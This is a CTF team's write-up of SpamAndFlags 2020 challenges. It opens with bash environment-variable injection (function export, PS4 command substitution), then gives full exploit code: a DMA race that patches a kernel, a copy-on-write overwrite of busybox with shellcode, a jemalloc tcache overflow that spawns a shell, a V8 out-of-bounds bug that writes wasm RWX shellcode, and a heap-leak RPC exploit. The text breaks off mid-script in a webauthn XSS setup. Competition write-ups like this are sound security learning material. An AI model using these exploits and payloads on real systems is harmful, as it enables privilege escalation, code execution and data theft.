# SpamAndFlags 2020 Writeup (A\*0\*E)

## pwn

### Environmental Issues

We have a chance to provide one environmental variable as well as the argument for a given bash script, and we should make it output the flag file under same directory. In order to capture all the flags we need to give more than 15 different env as solutions.

First, we diff the files with Regulated Environmental Issues (why not since both are released XD), which reveals the `grep` is very suspicious. Then we check each options of `grep` manually. We can use `-f/flag` to specify the pattern used. With `-r` we can scan each file at current directory including flag. But recursive is time consuming and we need to add another `-I` to ignore binary files to avoid timeout.

Here is the script we used

```
from pwn import *
import json

context.log_level='debug'

c = remote('35.242.189.239', 1337)

ans = [
]

for i in range(16):
    ans.append([chr(0x61+i),"1","-rIf/flag"])

ans = json.dumps(ans)

c.sendlineafter("\n\n", ans)
c.shutdown("write")
c.interactive()
```

### Regulated Environmental Issues

The `grep` issues is fixed so we really need to look at env variables. The first three is not hard to find. One with grep options, one with sed features, and one with `BASH_ENV`. Then we remember things like shellshock and begin to inject functions into bash, which provides another 10 solutions. Enough for flag 1.

The last two become extremely painful. Since already read the bash manual several times, we decide to look at bash source. There is no profit in checking those builtin functions (and echo/cat), but we are able to find NOTFOUND_HOOK, so we have code execution when calling `imaginary` by defining `command_not_found_handle`. This is the 14-th solution.

At that time we figure out the only unused part of given script is `set -x` but are stuck again. (We also stare at `/dev/null` file for a while, and look at env used by nsjail) Finally one teammate suggests printing all the functions encoutered by bash. Since we add hook at `find_function` it would be natural to include `find_variable`, and we have a list of all candidates env variables. When going through it we notice the `PS4` and a test of command injection just succeeds marvellously.

The script listed below. Some failed attempts not removed.
```
from pwn import *
import json

context.log_level='debug'

c = remote('35.242.189.239', 1338)

ans = [
["GREP_OPTIONS", "1 /flag", "a"],
["USE_SED","1","Hab/{r /flag\nd}#"],
["BASH_ENV", "/flag", "qwe"],
["BASH_FUNC_grep%%", "() { cat /flag; }", "aaa"],
["BASH_FUNC_echo%%", "() { cat /flag; }", "aaa"],
["BASH_FUNC_set%%", "() { cat /flag; }", "aaa"],
["BASH_FUNC_test%%", "() { cat /flag; }", "aaa"],
["BASH_FUNC_exec%%", "() { cat /flag; }", "aaa"],
["BASH_FUNC_eval%%", "() { cat /flag; }", "aaa"],
["BASH_FUNC_bash%%", "() { cat /flag; }", "aaa"],
["BASH_FUNC_return%%", "() { cat /flag; }", "aaa"],
["BASH_FUNC_hash%%", "() { silent () { /bin/cat /flag; } ; return 1; }", "qwe"],
["BASH_FUNC_cat%%", "() { read f </flag; echo $f >/proc/1/fd/1; }", "qwe"],
["BASH_FUNC_command_not_found_handle%%", "() { read f </flag; echo $f >/proc/1/fd/1; }", "aa"],
["PS4", "`cat /flag`", "qwe"],
]
#["BASHOPTS", "autocd:cdable_vars:cdspell:checkhash:checkjobs:checkwinsize:cmdhist:compat31:compat32:compat40:compat41:compat42:compat43:complete_fullquote:direxpand:dirspell:dotglob:execfail:expand_aliases:extdebug:extglob:extquote:failglob:force_fignore:globasciiranges:globstar:gnu_errfmt:histappend:histreedit:histverify:hostcomplete:huponexit:inherit_errexit:interactive_comments:lastpipe:lithist:login_shell:mailwarn:no_empty_cmd_completion:nocaseglob:nocasematch:nullglob:progcomp:promptvars:restricted_shell:shift_verbose:sourcepath:xpg_echo", "qwe"]
#["SHELLOPTS", "allexport:braceexpand:emacs:errexit:errtrace:functrace:hashall:histexpand:history:ignoreeof:interactive-comments:keyword:monitor:noclobber:noexec:noglob:nolog:notify:nounset:onecmd:physical:pipefail:posix:privileged:verbose:vi:xtrace", "qwe"]
#["BASH_XTRACEFD", "0", "aa"],
#["BASH_FUNC_--%%", "() { read f </flag; echo $f >/proc/1/fd/1; }", "aaa"],
#["BASH_FUNC_USE_SED%%", "() { read f </flag; echo $f >/dev/null; }", "qwe"],


ans = json.dumps(ans)

c.sendlineafter("\n\n", ans)
c.shutdown("write")
c.interactive()
```

### SecStore 1 & 2

This challenge has two parts:
1. `qemu.patch` add a new DMA device called `secstore` to qemu. It simlate a device to copy data between `secmem` (secure storage, cannot direct access by kernel) and `apmem` (phsyisc mem).
2. `sec-store.c`(driver): this is source code of a LKM. which implements a char device. It provides interface for user-space process to access `secstore` (store data to secmem, or load data from secmem).

#### SecStore 1
```
  #define MAX_LLI 8
  struct lli{
      uint64_t src;
      uint64_t dst;
      uint32_t size;
      uint32_t ctrl;
  };
```
1. Bug in the driver:
    1. After open the device, user can send DMA request by invoking read/write syscall on, to copy data to/from `data_buffer` from/to secmem. `read(device_fd, (lli*)cmd_buffer, cmd_buffer_len)`.
    2. when copy data from secmem, `dst` should be the virtual address of `data_buffer`, `src` should be offset in secmem. 
    3. Driver will map `cmd_buffer` in to kernel, and map the user memory in to kernel
        * STEP1: for all `data_buffer` and `cmd_buffer` the driver pin the them by calling `pin_user_pages` and map then into kernel space. (so we cannot ask the driver to access kernel space(`pin_user_pages` will fail))
        * STEP2: then driver change the values in `cmd_buffer` (change address, add some bit)
        * STEP3: then driver will send address of cmd_buffer to DMA.
    4. So here is a TOCTOU bug, we can change `buffer_address` after STEP2. Since the DMA device don't check if the address is user/kernel, we have chance to copy data from/to kernel to/from secmem。
    5. the LKM also printk some address, so we can leak kernel base.
    6. Then Our exp overwrite the code of sys_umount (DMA will direct write phisycal memory, so no need to worry any memory protection.)
```C
#include <pthread.h>
#include <string.h>

#include <unistd.h>

#include <stdint.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <stdio.h>
#include <stdlib.h>

#include <stdio.h>
#include <inttypes.h>

#include "data.h"


struct lli{
    uint64_t src;
    uint64_t dst;
    uint32_t size;
    uint32_t ctrl;
};
int dev_fd;
volatile struct lli * dev_buf;
volatile char * playground;
volatile int go_bool = 0;
volatile int raced = 0;
volatile int enable_race = 0;
volatile uint64_t target_addr;

void trigger_thread() {
	printf("trigger_thead starts\n");
	int t = 0;
	while(1) {
		int i = 0;
		for (i = 0; i < 8; i++) {
			dev_buf[i].src = 0;
			dev_buf[i].dst = (uint64_t)playground;
			dev_buf[i].size = 0x1000;
			dev_buf[i].ctrl = 0;
		}
		read(dev_fd, dev_buf, sizeof(struct lli) * 8);
		if (raced) break;
	}
}
void change_thread() {
	printf("race thread starts\n");
	int t = 0;
	while(!raced) {
		if (dev_buf[0].dst >= 0x1000000000000) // when this page mapped into kernel
			//dev_buf[0].dst = (uint64_t) 0xffff800010080000 + 0x1ce000;//0x1ce568;
			dev_buf[0].dst = (uint64_t) target_addr  + 0x1ec000;//0x1eced0;
		if (dev_buf[7].dst < 0x1000000000000) {
			printf("raced\n");
			raced = 1;
		}
	}

}

void read_trigger_thread() {
	printf("trigger_thead starts\n");
	int t = 0;
	while(1) {
		int i = 0;
		for (i = 0; i < 8; i++) {
			dev_buf[i].src = playground;
			dev_buf[i].dst = ((i==0)?0x0:0x1000);
			dev_buf[i].size = 0x1000;
			dev_buf[i].ctrl = 0;
		}
		enable_race = 1;
		write(dev_fd, dev_buf, sizeof(struct lli) * 8);
		enable_race = 0;
		if (raced) break;
	}
}
void read_change_thread() {
	printf("race thread starts\n");
	int t = 0;
	while(!raced) {
		if (enable_race) {
			if (dev_buf[0].src >= 0x1000000000000) { // when this page mapped into kernel
				dev_buf[0].src = (uint64_t) target_addr;//0x1ce568;
				if (dev_buf[7].src < 0x1000000000000) {
					raced = 1;
				}
			}
		}
	}

}

int main() {
	FILE * fp = popen("dmesg", "r");
	uint64_t offset = 0;
	while (1) {
		char line[1024];
		fgets(line, 1024, fp);
		printf("%s\n", line);
		char * s = strstr(line, "vmmod ");
		if (s) {
			//vmmod ffff800008902510
			s[6+16] = '\x00';
			char * p = NULL;
			printf("%s\n", &s[6]);
			target_addr = strtoull(&s[6], &p, 16);
			printf("%llx\nenter..", target_addr);
			target_addr -= 0xc0;
			offset = target_addr % 0x1000;
			target_addr -= (target_addr % 0x1000);
			break;
		}
	}
	printf("%llx\nenter..", target_addr);
	char buf[1024];
	//gets(buf);

	dev_buf = (struct lli *) mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS, -1, 0);
	playground = (char *) mmap(NULL, 0x100000, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS, -1, 0);
	printf("%p %p\n", dev_buf, playground);

	dev_fd = open("/dev/sec", O_RDWR, 0);
	if (dev_fd < 0) perror("cannot open /dev/sec");

	if (1) {
		int j =0;
		for (;j<10000;j++) {
			pthread_t t1, t2;
			raced = 0;
			pthread_create(&t1, NULL, &read_trigger_thread, NULL);
			pthread_create(&t2, NULL, &read_change_thread, NULL);
			while (!raced) {
			}
			dev_buf[0].src = 0;
			dev_buf[0].dst = (uint64_t)playground;
			dev_buf[0].size = 0x1000;
			dev_buf[0].ctrl = 0;
			read(dev_fd, dev_buf, sizeof(struct lli)*1);
			printf("%llx ", target_addr);
			int i;
			for (i = 0; i < 0x200; i ++) {
				printf("%02x ", playground[offset+i]);
			}
			printf("\n");
			for (i = 0; i< 0x1000; i++) {
				if (playground[i] != 0)  break;
			}
			if (i < 0x100) break;
		}
	}
	target_addr = *(volatile uint64_t*)(&playground[offset]);
	printf("v1: %llx\n", target_addr);
	target_addr -= 0x12918e8;
	printf("kslide: %llx\n", target_addr);
	uint64_t kslide = target_addr;




	target_addr = kslide + 0x20000;
	int j = 0;
	for (;j<5;j++) {
		pthread_t t1, t2;
		raced = 0;
		pthread_create(&t1, NULL, &read_trigger_thread, NULL);
		pthread_create(&t2, NULL, &read_change_thread, NULL);
		while (!raced) {
		}
		dev_buf[0].src = 0;
		dev_buf[0].dst = (uint64_t)playground;
		dev_buf[0].size = 0x100;
		dev_buf[0].ctrl = 0;
		read(dev_fd, dev_buf, sizeof(struct lli)*1);
		printf("%llx ", target_addr);
		int i;
		for (i = 0; i < 16; i ++) {
			printf("%02x ", playground[i]);
		}
		printf("\n");
		if (memcmp(playground, "\x03\x3C\x40\xF9\x3F\x23\x03\xD5\x20\x10\x40\xF9\x1F\xFC\x00\xF1", 16) == 0){
			printf("verified slide\n");
			break;
		}
	}
	//return 0;
	//code[0x568] = 0x3f;
	//code[0x569] = 0x23;
	//code[0x56a] = 0x03;
	//code[0x56b] = 0xd5;
	char code[0x1000];
	sleep(1);
	raced = 1;
	sleep(1);
	target_addr = kslide;
	memset(&code[0x0], 0, 0x1000);
	memcpy(code, code_origin, 0x1000);
	memcpy(&code[0xed0], "\x3f\x23\x03\xD5", 4);
	memcpy(&code[0xed4], "\xFD\x7B\xB6\xA9\x00\x00\x80\xD2\xf3\xf1\xf9\x97\x1F\x20\x03\xD5\x3f\xf1\xf9\x97", 16+4);
	//memcpy(&code[0xed4], "\x00\x00\x00\x00", 4);
	//memcpy(&code[0x56c], "\x1F\x20\x03\xD5\x1F\x20\x03\xD5\x1F\x20\x03\xD5\x1F\x20\x03\xD5", 16);
	//memcpy(&code[0x56c], "\x00\x00\x80\xD2\x00\x00\x00\x00\x1F\x20\x03\xD5\x9A\x6B\xFA\x97", 16);
	//memset(&code[0x0], 0, 0x800);
	memcpy(&code[0xee8], "\xFD\x7B\xCA\xA8\x00\x00\x80\x52\xbf\x23\x03\xd5\xc0\x03\x5f\xd6", 16);
	/*
	code[0xee4] = 0x00;
	code[0xee5] = 0x00;
	code[0xee6] = 0x80;
	code[0xee7] = 0x52;

	code[0xee8] = 0xbf;
	code[0xee9] = 0x23;
	code[0xeea] = 0x03;
	code[0xeeb] = 0xd5;
	//memcpy(&code[0x580], "\x1F\x20\x03\xD5", 16);

	code[0xeec] = 0xc0;
	code[0xeed] = 0x03;
	code[0xeee] = 0x5f;
	code[0xeef] = 0xd6;
	*/

	printf("prepare done\n");

	//memset(code, 0, 0x800);
	int i;
	for (i = 0; i < 0x1000; i++) {
		playground[i] = code[i];
	}
	memcpy(playground, code, 0x1000);
	//memset(playground, 0, 0x1000);
	dev_buf[0].src = (uint64_t)playground;
	dev_buf[0].dst = 0;
	dev_buf[0].size = 0x1000;
	dev_buf[0].ctrl = 0;
	printf("prepare done2\n");

	write(dev_fd, dev_buf, sizeof(struct lli)*1);

	dev_buf[0].src = 0;
	dev_buf[0].dst = (uint64_t)playground;
	dev_buf[0].size = 0x1000;
	dev_buf[0].ctrl = 0;
	read(dev_fd, dev_buf, sizeof(struct lli)*1);
	printf("data: %s\n", playground);
	printf("wait...\n");

	sleep(1);
	for (i = 0; i < 40; i++) {
	pthread_t t1, t2;
	raced = 0;
	pthread_create(&t1, NULL, &trigger_thread, NULL);
	pthread_create(&t2, NULL, &change_thread, NULL);

	printf("wait...\n");

	go_bool = 1;
	printf("ok!\n");

	while(!raced);
	}
	umount("1234");
	if (1) {
		int fd = open("/flag", O_RDONLY, 0);
		if (fd > 0) {
			char buf[1025];
			int size = read(fd, buf, 1024);
			if (size > 0) {
				buf[size] = '\x00';
				printf("flag: %s\n", buf);
			}
			close(fd);
		}
	}
	printf("go?\n");
	execl("/bin/sh", "/bin/sh", NULL);





	return 0;

}

```


#### SecStore 2
In this challenge, previous TOCTOU bug is patched. `cmd_buffer` will firtly be copied into allocated memory by kernel.

The problem is that kernel don't check if the memory is cow page. So we can ask the driver to overwrite some pages that shared by other process (like dirty cow?).

Our exp overwrites `busybox`, which shared with `init` process running as root. then we are able to output the the flag.
```C
#include <errno.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <stdio.h>
#include <stdlib.h>

#include <stdio.h>
#include <inttypes.h>

#include "data.h"


struct lli{
    uint64_t src;
    uint64_t dst;
    uint32_t size;
    uint32_t ctrl;
};

int dev_fd;
volatile struct lli * dev_buf;
volatile char * playground;
volatile int go_bool = 0;
volatile int raced = 0;
volatile int enable_race = 0;
volatile uint64_t target_addr;

void move(void * dst, void * src) {

	memset(playground, 0, 0x1000);
	dev_buf[0].src = (uint64_t)src;
	dev_buf[0].dst = 0;
	dev_buf[0].size = 0x1000;
	dev_buf[0].ctrl = 0;

	write(dev_fd, dev_buf, sizeof(struct lli)*1);

	dev_buf[0].src = 0;
	dev_buf[0].dst = (uint64_t)dst;
	dev_buf[0].size = 0x1000;
	dev_buf[0].ctrl = 0;
	read(dev_fd, dev_buf, sizeof(struct lli)*1);
}

int main() {
	int fd = open("/bin/busybox", O_RDONLY, 0);
	volatile char * busybox = (char *) mmap(NULL, 0x1d7000, PROT_READ, MAP_PRIVATE, fd, 0);
	printf("%llx\n", busybox);


	volatile char * buf = (char *) mmap(NULL, 0x100000, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS, -1, 0);

	dev_buf = (struct lli *) mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS, -1, 0);
	playground = (char *) mmap(NULL, 0x100000, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS, -1, 0);
	printf("%p %p\n", dev_buf, playground);

	dev_fd = open("/dev/sec", O_RDWR, 0);
	uint64_t offset = 0;
	for (offset = 0x1000; offset < 0x165000; offset+= 0x165000) {
		move(buf, &busybox[offset]);
		int x;
		for (int x; x < 0x1000; x+=4) {
			memcpy(&buf[x], "\x1f\x20\x03\xd5", 4);
		}
		memcpy(&buf[0x1000-96], "\xee\xc5\x8c\xd2\x8e\x2d\xac\xf2\xee\x0c\xc0\xf2\xee\x0f\x1f\xf8\x80\xf3\x9f\xd2\xe0\xff\xbf\xf2\xe0\xff\xdf\xf2\xe0\xff\xff\xf2\xe1\x03\x00\x91\xe2\x03\x1f\xaa\xe3\x03\x1f\xaa\x08\x07\x80\xd2\x01\x00\x00\xd4\x01\xa0\x8b\xd2\xc1\x0b\xa0\xf2\x02\x00\x82\xd2\xe8\x07\x80\xd2\x01\x00\x00\xd4\x20\x00\x80\xd2\x01\xa0\x8b\xd2\xc1\x0b\xa0\xf2\x02\x00\x82\xd2\x08\x08\x80\xd2\x01\x00\x00\xd4", 96);
		move(&busybox[0x9f000], buf);
	}
	return; // exit `sh`, you will see the flag on terminal
}

```

### House of Sweets And Selfies

This is an android native pwnable challenge, the environment is Android 7 and jemalloc 4.1.0. We can add, edit, show, delete sweets and selfies, which are in two new threads, there is a 0x40 bytes heap overflow vulnerability when editing selfies. So, what data should we overwrite?

First, we consider whether the buffer returned by malloc in the program contains some useful data, such as function pointer and buffer address. Unfortunately, the data in the buffer is input by the user. Then we consider overwriting the heap management related metadata, chunk header or tcache metadata. The attack method of chunk header can refer to [Pseudomonarchia jemallocum](http://phrack.org/issues/68/10.html). Since we can only overflow 0x40 bytes, we can't overwrite the `arena_chunk_map_bits_t` and `arena_chunk_map_misc_t` array, only overwrite `node->en_arena`, but we can't leak information and control enough data, so attacking the chunk header is not feasible. In the end we can only attack tcache metadata, which is defined as follows.

```c
struct tcache_bin_s {
	tcache_bin_stats_t tstats;
	int		low_water;	/* Min # cached since last GC. */
	unsigned	lg_fill_div;	/* Fill (ncached_max >> lg_fill_div). */
	unsigned	ncached;	/* # of cached objects. */
	/*
	 * To make use of adjacent cacheline prefetch, the items in the avail
	 * stack goes to higher address for newer allocations.  avail points
	 * just above the available space, which means that
	 * avail[-ncached, ... -1] are available items and the lowest item will
	 * be allocated first.
	 */
	void		**avail;	/* Stack of available objects. */
};

struct tcache_s {
	ql_elm(tcache_t) link;		/* Used for aggregating stats. */
	uint64_t	prof_accumbytes;/* Cleared after arena_prof_accum(). */
	ticker_t	gc_ticker;	/* Drives incremental GC. */
	szind_t		next_gc_bin;	/* Next bin to GC. */
	tcache_bin_t	tbins[1];	/* Dynamically sized. */
	/*
	 * The pointer stacks associated with tbins follow as a contiguous
	 * array.  During tcache initialization, the avail pointer in each
	 * element of tbins is initialized to point to the proper offset within
	 * this array.
	 */
};
```

The `avail` stores cached region addresses. So if we can overwrite `avail`, we can `malloc` region at any address. This method is also introduced in [Pseudomonarchia jemallocum](http://phrack.org/issues/68/10.html), but the offset of `tbin[0]->avail` exceeds 0x40 bytes, and then we are stuck.

After a while, I started to review the allocation and release in tcache, as follows.

```c
JEMALLOC_ALWAYS_INLINE void *
tcache_alloc_easy(tcache_bin_t *tbin, bool *tcache_success)
{
	void *ret;

	if (unlikely(tbin->ncached == 0)) {
		tbin->low_water = -1;
		*tcache_success = false;
		return (NULL);
	}
	/*
	 * tcache_success (instead of ret) should be checked upon the return of
	 * this function.  We avoid checking (ret == NULL) because there is
	 * never a null stored on the avail stack (which is unknown to the
	 * compiler), and eagerly checking ret would cause pipeline stall
	 * (waiting for the cacheline).
	 */
	*tcache_success = true;
	ret = *(tbin->avail - tbin->ncached);
	tbin->ncached--;

	if (unlikely((int)tbin->ncached < tbin->low_water))
		tbin->low_water = tbin->ncached;

	return (ret);
}

JEMALLOC_ALWAYS_INLINE void
tcache_dalloc_small(tsd_t *tsd, tcache_t *tcache, void *ptr, szind_t binind,
    bool slow_path)
{
	tcache_bin_t *tbin;
	tcache_bin_info_t *tbin_info;

	assert(tcache_salloc(ptr) <= SMALL_MAXCLASS);

	if (slow_path && config_fill && unlikely(opt_junk_free))
		arena_dalloc_junk_small(ptr, &arena_bin_info[binind]);

	tbin = &tcache->tbins[binind];
	tbin_info = &tcache_bin_info[binind];
	if (unlikely(tbin->ncached == tbin_info->ncached_max)) {
		tcache_bin_flush_small(tsd, tcache, tbin, binind,
		    (tbin_info->ncached_max >> 1));
	}
	assert(tbin->ncached < tbin_info->ncached_max);
	tbin->ncached++;
	*(tbin->avail - tbin->ncached) = ptr;

	tcache_event(tsd, tcache);
}
```

I noticed that we can overwrite `tbin->ncached` to make `tbin->avail - tbin->ncached` point to a place we can control, and the offset of `tbin[0]->ncached` is just `0x38`, so we can allocate region to address we control, and then we can read and write anywhere.

Finally, we modify `fp->_write` to `system` and `fp->_cookie` to `/system/bin/sh`, getshell when calling `fflush`. In addition, the [shadow](https://census-labs.com/media/shadow-infiltrate-2017.pdf) [plugin](https://github.com/CENSUS/shadow) is very helpful for debugging jemalloc.

```python
from pwn import *
import subprocess

DEBUG = 1
LOCAL = 0

if DEBUG:
    context.log_level = 'debug'

if LOCAL:
    io = process(['adb', 'shell', '/data/local/tmp/house_of_sweets'])
else:
    io = remote('35.242.184.54', 1337)
    io.recvuntil('hashcash -mqb28 ')
    chall = io.recvuntil('\n')[:-1]
    print chall
    answer = subprocess.check_output(['hashcash', '-mqb28', chall]).strip()
    print answer
    io.sendline(answer)

def add_selfies(size):
    io.recvuntil('Leave\n')
    io.sendline('2')
    io.recvuntil('Nevermind\n')
    io.sendline('1')
    io.recvuntil('modern\n')
    io.sendline('2')
    io.recvuntil('image?\n')
    io.sendline(str(size))

def edit_selfies(idx, size, buf):
    io.recvuntil('Leave\n')
    io.sendline('2')
    io.recvuntil('Nevermind\n')
    io.sendline('2')
    io.recvuntil('edit?\n')
    io.sendline(str(idx))
    io.recvuntil('edit?\n')
    io.sendline(str(size))
    io.send(buf)

def add_sweets(size, is_classic=False):
    io.recvuntil('Leave\n')
    io.sendline('1')
    io.recvuntil('appetite\n')
    io.sendline('1')
    io.recvuntil('hipster\n')
    if is_classic:
        io.sendline('1')
        io.recvuntil('No\n')
        io.sendline('0')
    else:
        io.sendline('2')
    io.recvuntil('cake?\n')
    io.sendline(str(size))

def show_sweets(idx):
    io.recvuntil('Leave\n')
    io.sendline('1')
    io.recvuntil('appetite\n')
    io.sendline('3')
    io.recvuntil('bake?\n')
    io.sendline(str(idx))

def edit_sweets(idx, size, buf):
    io.recvuntil('Leave\n')
    io.sendline('1')
    io.recvuntil('appetite\n')
    io.sendline('2')
    io.recvuntil('modify?\n')
    io.sendline(str(idx))
    io.recvuntil('ingredients?\n')
    io.sendline(str(size))
    io.send(buf)

def delete_sweets(idx):
    io.recvuntil('Leave\n')
    io.sendline('1')
    io.recvuntil('appetite\n')
    io.sendline('4')
    io.recvuntil('(Idx)\n')
    io.sendline(str(idx))    

for i in range(2+4+4):
    add_selfies(0x1c00)
add_sweets(8)
add_sweets(8)
edit_sweets(1, 0x8, p64(0))
payload = p64(0) * 2 + p64(0) + p64(0x000000e4000000e3) + p64(0) + p64(1) + p64(0x00000001ffffffff) + p64(0x20a0)
edit_selfies(9, 0x1c00, 'A' * (0x1c00 - 0x40) + payload)
delete_sweets(0)
show_sweets(1)
io.recvuntil('\n')
leak_heap_addr = u64(io.recvn(8))
print 'leak_heap_addr:', hex(leak_heap_addr)
addr1 = leak_heap_addr - 0x3b40
print hex(addr1)
payload = p64(addr1) + p64(0) * 2 + p64(0) + p64(0x000000e4000000e3) + p64(0) + p64(1) + p64(0x00000001ffffffff) + p64(0xc2)
edit_selfies(9, 0x1c00, 'A' * (0x1c00 - 0x48) + payload)
add_sweets(8, True) # 0
payload = p64(addr1) + p64(0) * 2 + p64(0) + p64(0x000000e4000000e3) + p64(0) + p64(1) + p64(0x00000001ffffffff) + p64(0xc2)
edit_selfies(9, 0x1c00, 'A' * (0x1c00 - 0x48) + payload)
add_sweets(8) # 2
edit_sweets(2, 0x1, '\xff')
show_sweets(0)
io.recvuntil('\n')
leak_addr = u64(io.recvuntil('\n')[:-1].ljust(8, '\x00')) & 0xffffffffffffff00
libc_addr = leak_addr + 0x42000
system = leak_addr + 0xa816c
print 'libc_addr:', hex(libc_addr)
print 'system:', hex(system)

add_sweets(0x30) # 3
addr3 = leak_heap_addr + 0xffa0 # tbin[3]->ncached

# fp->_cookie
print hex(libc_addr+0xc3760)
payload = p64(libc_addr+0xc3760) + p64(addr3) + p64(0) * 2 + p64(0) + p64(0x000000e4000000e3) + p64(0) + p64(1) + p64(0x00000001ffffffff) + p64(0xc2)
edit_selfies(9, 0x1c00, 'A' * (0x1c00 - 0x50) + payload)
add_sweets(8) # 4
edit_sweets(4, 8, p64(0xdb))
add_sweets(0x30) # 5

edit_sweets(5, 0x28, p64(libc_addr+0x9ce04) + p64(libc_addr+0x72948) + p64(libc_addr+0x72950) + p64(0) + p64(system))

io.interactive()
```

### Nativity Scene

Since the challenge allowed `--allow-natives-syntax` flag in `d8`, we was able to call native runtime functions and successfully found an OOB bug in `%TypedArrayCopyElements`. To exploit this OOB bug, we need to bypass ASLR. Luckily since 8.0(or 8.1) version, v8 changed its memory layout. It only stores low 4 bytes of a handle on the heap, which is fixed and allow us to break the v8 heap's ASLR.

```javascript=
BigInt.prototype.hex = function() {
    return '0x' + this.toString(16);
};
function hex(a, b) {
    a = '00000000'+a.toString(16);
    b = '00000000'+b.toString(16);
    a = a.substring(a.length-8,a.length);
    b = b.substring(b.length-8,b.length);
    return '0x'+a+b;
}

const shellcode = [0x616c666890909090n, 0x31e7894858026a67n, 0xffffba41050f99f6n, 0x58286ac689487fffn, 0xfeeb050f995f016an];

const wasm_simple = [
    0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x01, 0x08, 0x02, 0x60,
    0x01, 0x7f, 0x00, 0x60, 0x00, 0x00, 0x02, 0x19, 0x01, 0x07, 0x69, 0x6d,
    0x70, 0x6f, 0x72, 0x74, 0x73, 0x0d, 0x69, 0x6d, 0x70, 0x6f, 0x72, 0x74,
    0x65, 0x64, 0x5f, 0x66, 0x75, 0x6e, 0x63, 0x00, 0x00, 0x03, 0x02, 0x01,
    0x01, 0x07, 0x11, 0x01, 0x0d, 0x65, 0x78, 0x70, 0x6f, 0x72, 0x74, 0x65,
    0x64, 0x5f, 0x66, 0x75, 0x6e, 0x63, 0x00, 0x01, 0x0a, 0x08, 0x01, 0x06,
    0x00, 0x41, 0x2a, 0x10, 0x00, 0x0b
];

let wasm_code = new Uint8Array(wasm_simple);

let rwx_page_addr = undefined;

var wasm_importObject = {
    imports: {
    imported_func: function(arg) {
        for (let i = 0; i < 0x10000; i++) {
            var b = 1;
        }
    }
    }
}

function gc() { for (var i = 0; i < 0x10000; ++i) new String(); }
function gcc() { var temp = []; for (var i = 0; i < 0x100000; ++i) temp.push(new Set()); }
function hex2float(val) {
    return val * 4.94065645841246544E-324;
}
function float2hex(val) {
    return val / 4.94065645841246544E-324;
}
function hex(val) {
    return "0x" + val.toString(16);
}

let wasm_mod = new WebAssembly.Instance(new WebAssembly.Module(wasm_code), wasm_importObject);
let wasm_func = wasm_mod.exports.exported_func;

let ab = new ArrayBuffer(0x10);
let u32a = new Uint32Array(ab);
let f64a = new Float64Array(ab);
let u64a = new BigUint64Array(ab);
let da = new Array(1.1,2.2,3.3,4.4);
gc();gc();


let a = new Uint32Array(16);

let evil_a = new BigUint64Array(1);
let o = new Object();
o.a = wasm_func;


let source_arr = new Array(17);
source_arr.fill(0x08241891);
%TypedArrayCopyElements(a, source_arr, 17);


f64a[0] = a[34];
// read wasm_func
u32a[2] = u32a[1] + 0xc - 8;
f64a[0] = a[30];
u32a[1] = u32a[2];
a[30] = f64a[0];
u64a[1] = evil_a[0];

// read shared_info
u32a[1] = u32a[2] - 0x88 - 8;
a[30] = f64a[0];
u64a[1] = evil_a[0];
rwx_addr = u64a[1];
console.log(rwx_addr.hex());

// write rwx
u32a[0] = u32a[3];
u32a[1] = u32a[2] - 7;
a[30] = f64a[0];

// write length
a[28] = 5.43230922487e-312;
for (let i = 0, len = shellcode.length; i < len; i++) {
    evil_a[i] = shellcode[i];
}
wasm_func();
```

### Hashing@Home

The vulnerability is that the server sends the `hash_rpc_context` pointers to user directly and receives them later. The only check the server does is to compare the first 8 bytes magic of user provided pointer with the `CONTEXT_MAGIC`. This could be easily bypassed by giving a pointer which points to data_to_hash in the structure. Then we can use the `send_request` in the `hash_together_the_first_two` to do one time limited read.

Luckily we found that the `key_bytes` on the heap is the flag.

```python
from pwn import *

context(terminal='zsh', arch='amd64', log_level='info')

p = remote('35.230.128.35', 1337)

def recv_req():
    heap_addr = u64(p.recvn(8))
    data = p.recvn(32)
    return heap_addr, data

def send_req(addr, data):
    p.send(p64(addr))
    p.send(data.ljust(32, b'\x00'))
    return recv_req()

magic = 0x6861736822686f6d
for i in range(16):
    heap_addr, data = recv_req()
fir_ctx = heap_addr + 0x40 * 15
sec_ctx = heap_addr + 0x40 * 14
print(hex(sec_ctx))
send_req(fir_ctx, p64(0)*4)
send_req(heap_addr, p64(magic)+p64(1))

send_req(sec_ctx, p64(magic)*4)
payload = p64(0)+p64(sec_ctx-0x3c0-0x18)
send_req(sec_ctx+0x30, payload)

print(send_req(heap_addr+0x18, b''))

p.interactive()
```


## web

### Journey: Chapter I

We can get the source code from `http://journey.ctf.spamandhex.com/source`, and build the environment by running
```shell
npm init
npm i -S express-session bcrypt express body-parser express-session webauthn express-async-errors
```

This is obviously an XSS challenge because the results of `/report` will be reviewed by the administrator. The `/report` interface limits the origin of url. So we need to find a page in this website we can control the content.

We noticed that `db` is shared between app and `webauthn`, and `/favorites` sends `obj[type]` from ``db.get(`fav_${favId}`)``. So we can register a `webauthn` user whose username starts with `fav_`. We get a controlled page: `/favorites?type=name&favId=xxx`.

We have a real yubikey, but in `http` webauthn is disabled. And the challenge process has origin check. So we have to write a python script to register `webauthn` user.


```python
import requests
import string
import random
import sys
from fido2.hid import CtapHidDevice
from fido2.client import Fido2Client, WindowsClient
from fido2.server import Fido2Server
from fido2.webauthn import (
    AuthenticatorSelectionCriteria,
    PublicKeyCredentialRpEntity,
    PublicKeyCredentialUserEntity,
    PublicKeyCredentialParameters,
    PublicKeyCredentialDescriptor,
    PublicKeyCredentialCreationOptions,
    PublicKeyCredentialRequestOptions,
)
import base64
import json

ENDPOINT = 'http://localhost:3000'
ENDPOINT = 'http://journey.ctf.spamandhex.com'

dev = next(CtapHidDevice.list_devices(), None)
if dev is not None:
    print("Use USB HID channel.")
    use_prompt = True
else:
    try:
        from fido2.pcsc import CtapPcscDevice

        dev = next(CtapPcscDevice.list_devices(), None)
        print("Use NFC channel.")
    except Exception as e:
        print("NFC channel search error:", e)

if not dev:
    print("No FIDO device found")
    sys.exit(1)

